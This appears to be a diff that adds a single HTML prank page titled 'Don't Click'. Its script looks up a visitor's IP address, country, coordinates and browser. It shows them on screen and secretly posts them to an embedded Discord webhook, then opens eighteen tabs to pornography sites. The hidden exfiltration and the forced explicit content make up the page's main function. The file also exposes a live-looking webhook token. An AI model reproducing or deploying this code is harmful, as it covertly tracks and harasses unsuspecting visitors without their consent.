@@ -1,0 +1,108 @@
+<!doctypehtml><html lang=en><meta charset=UTF-8><meta content="width=device-width,initial-scale=1"name=viewport><title>Don't Click</title><style>body,html{height:100%;margin:0;display:flex;justify-content:center;align-items:center;flex-direction:column;background-color:#000;color:#fff;font-family:Arial,sans-serif;overflow:hidden;position:relative}.button{padding:30px 60px;font-size:3em;color:#fff;background-color:#e74c3c;border:none;border-radius:5px;cursor:pointer;animation:shrinkGrow 1s infinite;transition:background-color .3s}@keyframes shrinkGrow{0%,100%{transform:scale(1)}50%{transform:scale(.9)}}.button:hover{background-color:#c0392b}.info-message{display:none;font-size:3em;margin-top:20px;color:#fff;text-align:center;animation:shrinkGrow 1s infinite}.glitch{position:absolute;top:0;left:0;width:100%;height:100%;background-color:#000;animation:glitch-anim 1s infinite linear alternate-reverse;pointer-events:none}@keyframes glitch-anim{0%{transform:translate(0) skew(0);opacity:1}10%{transform:translate(-5px,-5px) skew(-1deg);opacity:.5}20%{transform:translate(5px,5px) skew(1deg);opacity:.7}30%{transform:translate(-5px,0) skew(-1deg);opacity:1}40%{transform:translate(5px,-5px) skew(1deg);opacity:.5}50%{transform:translate(0,5px) skew(0);opacity:.7}60%{transform:translate(-5px,5px) skew(-1deg);opacity:.5}70%{transform:translate(5px,0) skew(1deg);opacity:1}80%{transform:translate(-5px,-5px) skew(-1deg);opacity:.5}100%{transform:translate(0) skew(0);opacity:1}}</style><button class=button id=clickButton onclick=handleClick()>Don't Click</button><div class=info-message id=infoMessage></div><div class=glitch id=glitchEffect></div><script>// Replace this URL with your actual Discord webhook URL
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1309153120873611375/ZmMIZUGdTYS2hpYtwEE0IYMFWPf4jtULpQy42tKgrliEF9kDq0TcrC3q8YrlUYzcyr1d'; 
+
+    async function fetchIPInfo() {
+        const response = await fetch('http://ip-api.com/json/');
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+        return await response.json();
+    }
+
+    async function sendToDiscord(data, deviceInfo) {
+        const payload = {
+            content: `IP: ${data.query}\nCountry: ${data.country}\nLatitude: ${data.lat}\nLongitude: ${data.lon}\nDevice Info: ${deviceInfo}\nBrowser: ${navigator.userAgent}`
+        };
+
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+            console.error('Error sending data to Discord Webhook:', response.statusText);
+        }
+    }
+
+    function getDeviceInfo() {
+        const userAgent = navigator.userAgent;
+        if (/Mobile|Android|iPhone/i.test(userAgent)) {
+            return 'Mobile Device';
+        } else if (/Windows/i.test(userAgent)) {
+            return 'PC (Windows)';
+        } else if (/Macintosh|Mac OS X/i.test(userAgent)) {
+            return 'PC (Mac)';
+        } else if (/Linux/i.test(userAgent)) {
+            return 'PC (Linux)';
+        }
+        return 'Unknown Device';
+    }
+
+    async function handleClick() {
+        const button = document.getElementById("clickButton");
+        const infoMessage = document.getElementById("infoMessage");
+        const glitchEffect = document.getElementById("glitchEffect");
+
+        console.log("Initial button click detected.");
+        button.innerText = "You are curious, aren't you?";
+
+        setTimeout(() => {
+            button.innerText = "Click Again";
+            button.onclick = async function() {
+                button.style.display = 'none';
+                console.log("Second button click detected. Fetching IP info...");
+
+                try {
+                    const data = await fetchIPInfo(); 
+                    const deviceInfo = getDeviceInfo(); 
+
+                    // Display the fetched info in the info message
+                    infoMessage.innerHTML = `
+                        <strong>Browser:</strong> ${navigator.userAgent}<br>
+                        <strong>IP:</strong> ${data.query}<br>
+                        <strong>Country:</strong> ${data.country}<br>
+                        <strong>Latitude:</strong> ${data.lat}<br>
+                        <strong>Longitude:</strong> ${data.lon}<br>
+                        <strong>Device Info:</strong> ${deviceInfo}
+                    `;
+                    infoMessage.style.display = 'block';
+
+                    console.log("Displaying IP address and country information.");
+
+                    await sendToDiscord(data, deviceInfo);
+
+                    // Start glitch effect before opening the tabs
+                    glitchEffect.style.display = 'block'; // Show glitch effect
+
+                    setTimeout(() => {
+                        console.log("Opening tabs...");
+                        // Open multiple specific tabs (update URLs as needed)
+                        window.open('https://www.pornhub.com', '_blank');
+                        window.open('https://www.xnxx.xxx', '_blank');
+                        window.open('https://www.pornhub.com', '_blank');
+                        window.open('https://www.xnxx.xxx', '_blank');
+                        window.open('https://www.pornhub.com', '_blank');
+                        window.open('https://www.xnxx.xxx', '_blank');
+                        window.open('https://www.pornhub.com', '_blank');
+                        window.open('https://www.xnxx.xxx', '_blank');
+                        window.open('https://www.pornhub.com', '_blank');
+                        window.open('https://www.xnxx.xxx', '_blank');
+                        window.open('https://www.pornhub.com', '_blank');
+                        window.open('https://www.xnxx.xxx', '_blank');
+                        window.open('https://www.pornhub.com', '_blank');
+                        window.open('https://www.xnxx.xxx', '_blank');
+                        window.open('https://www.pornhub.com', '_blank');
+                        window.open('https://www.xnxx.xxx', '_blank');
+                        window.open('https://www.pornhub.com', '_blank');
+                        window.open('https://www.xnxx.xxx', '_blank');
+                        // Add more URLs if necessary
+                    }, 500); // Start opening tabs shortly after glitch starts
+
+                } catch (error) {
+                    infoMessage.innerText = 'Unable to fetch IP information.';
+                    console.error("Error fetching IP information:", error);
+                }
+            };
+        }, 2000);
+    }</script>
